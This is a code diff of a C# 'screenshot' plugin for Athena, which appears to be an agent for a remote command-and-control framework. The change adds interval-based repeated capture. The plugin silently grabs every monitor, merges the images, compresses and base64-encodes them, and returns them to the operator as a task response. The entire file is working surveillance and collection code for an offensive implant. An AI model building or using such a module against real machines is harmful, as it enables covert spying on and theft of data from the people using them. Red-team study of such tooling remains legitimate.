@@ -1,90 +1,154 @@
-﻿using Athena.Commands.Models;
-using System.Drawing;
-using System.Runtime.InteropServices;
+﻿using Athena.Commands;
+using Athena.Commands.Models;
 using Athena.Models;
-using System.IO.Compression;
-using System.IO;
-using Athena.Commands;
 using Athena.Models.Responses;
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
+using System.IO.Compression;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Threading.Tasks;
 
-//Nuget - System.drawing.common 
-//Only works on windows
 namespace Plugins
 {
     public class Screenshot : AthenaPlugin
     {
+        private CancellationTokenSource cts = new CancellationTokenSource();
+        private bool isRunning = false;
         public override string Name => "screenshot";
+
         public override void Execute(Dictionary<string, string> args)
+        {
+            int intervalInSeconds = 0; // Default interval should be 0 to take just one
+
+            if (args.ContainsKey("interval") && int.TryParse(args["interval"], out intervalInSeconds))
+            {
+                if (intervalInSeconds == 0)
+                {
+                    // If the interval is set to 0, it signifies a cancellation.
+                    if (isRunning)
+                    {
+                        // Cancel the running task and reset the flag.
+                        cts.Cancel();
+                        cts = new CancellationTokenSource();
+                        isRunning = false;
+                        TaskResponseHandler.Write("Screenshot task has been cancelled.", args["task-id"], true, "");
+                    }
+                    else
+                    {
+                        TaskResponseHandler.Write("No screenshot task is currently running.", args["task-id"], true, "info");
+                    }
+                    return;
+                }
+
+                if (intervalInSeconds < 0)
+                {
+                    TaskResponseHandler.Write("Invalid interval value. It must be a non-negative integer.", args["task-id"], true, "error");
+                    return;
+                }
+
+                // Handle starting a new screenshot task with the specified interval...
+                if (isRunning)
+                {
+                    TaskResponseHandler.Write("A screenshot task is already running. Wait for it to complete or cancel it.", args["task-id"], true, "error");
+                }
+                else
+                {
+                    Task.Run(async () =>
+                    {
+                        isRunning = true;
+                        await CaptureScreenshotsWithInterval(args, intervalInSeconds, cts.Token);
+                        isRunning = false;
+                    });
+                }
+            }
+            else
+            {
+                CaptureAndSendScreenshot(args);
+            }
+        }
+
+        private async Task CaptureScreenshotsWithInterval(Dictionary<string, string> args, int intervalInSeconds, CancellationToken token)
+        {
+            while (!token.IsCancellationRequested)
+            {
+                CaptureAndSendScreenshot(args);
+                try
+                {
+                    await Task.Delay(TimeSpan.FromSeconds(intervalInSeconds), token);
+                }
+                catch (TaskCanceledException)
+                {
+                    // Task was canceled, exit the loop.
+                    break;
+                }
+            }
+        }
+
+        private void CaptureAndSendScreenshot(Dictionary<string, string> args)
         {
             try
             {
+                var bitmaps = ScreenCapture.Capture();
+
+                // Determine the size of the combined bitmap
+                int combinedWidth = 0;
+                int maxHeight = 0;
+                foreach (var bitmap in bitmaps)
                 {
-                    var bitmaps = ScreenCapture.Capture();
-                    //Determine the size of the combined bitmap
-                    int combinedWidth = 0;
-                    int maxHeight = 0;
-                    foreach (var bitmap in bitmaps)
+                    combinedWidth += bitmap.Width;
+                    if (bitmap.Height > maxHeight)
                     {
-                        combinedWidth += bitmap.Width;
-                        if (bitmap.Height > maxHeight)
-                        {
-                            maxHeight = bitmap.Height;
-                        }
+                        maxHeight = bitmap.Height;
                     }
-
-                    //Create a new bitmap to hold the combined image
-                    var combinedBitmap = new Bitmap(combinedWidth, maxHeight);
-
-                    //Draw each screen's bitmap onto the combined bitmap
-                    int x = 0;
-                    foreach (var bitmap in bitmaps)
-                    {
-                        using (var graphics = Graphics.FromImage(combinedBitmap))
-                        {
-                            graphics.DrawImage(bitmap, x, 0);
-                        }
-                        x += bitmap.Width;
-                    }
-                    //Convert to b64
-                    var converter = new ImageConverter();
-                    var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
-                    byte[] outputBytes;
-
-                    //do compress here
-
-                    using (var memoryStream = new MemoryStream())
-                    {
-                        using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
-                        {
-                            gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
-                        }
-                        outputBytes = memoryStream.ToArray();
-                    }
-
-                    var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
-
-                    //Save the combined bitmap to a file
-                    //combinedBitmap.Save("combined_screenshots.png");
-
-                    //Base Code
-                    TaskResponseHandler.AddResponse(new ResponseResult
-                    {
-                        completed = true,
-                        user_output = "Done.",
-                        task_id = (string)args["task-id"],
-                        process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
-                    });
-
                 }
+
+                // Create a new bitmap to hold the combined image
+                var combinedBitmap = new Bitmap(combinedWidth, maxHeight);
+
+                // Draw each screen's bitmap onto the combined bitmap
+                int x = 0;
+                foreach (var bitmap in bitmaps)
+                {
+                    using (var graphics = Graphics.FromImage(combinedBitmap))
+                    {
+                        graphics.DrawImage(bitmap, x, 0);
+                    }
+                    x += bitmap.Width;
+                }
+
+                // Convert to base64
+                var converter = new ImageConverter();
+                var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
+                byte[] outputBytes;
+
+                // Compress the image
+                using (var memoryStream = new MemoryStream())
+                {
+                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
+                    {
+                        gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
+                    }
+                    outputBytes = memoryStream.ToArray();
+                }
+
+                var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
+                TaskResponseHandler.AddResponse(new ResponseResult
+                {
+                    completed = true,
+                    user_output = "Screenshot captured.",
+                    task_id = args["task-id"],
+                    process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
+                });
             }
             catch (Exception e)
             {
-                TaskResponseHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
-                return;
+                TaskResponseHandler.Write($"Failed to capture screenshot: {e.ToString()}", args["task-id"], true, "error");
             }
         }
     }
-
 
     class ScreenCapture
     {
@@ -163,6 +227,7 @@ namespace Plugins
                 var mi = new DisplayInfo();
                 mi.Bounds = new Rectangle(lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top);
                 monitors.Add(mi);
+
                 return true;
             });
 
@@ -174,5 +239,4 @@ namespace Plugins
             return monitors;
         }
     }
-
 }
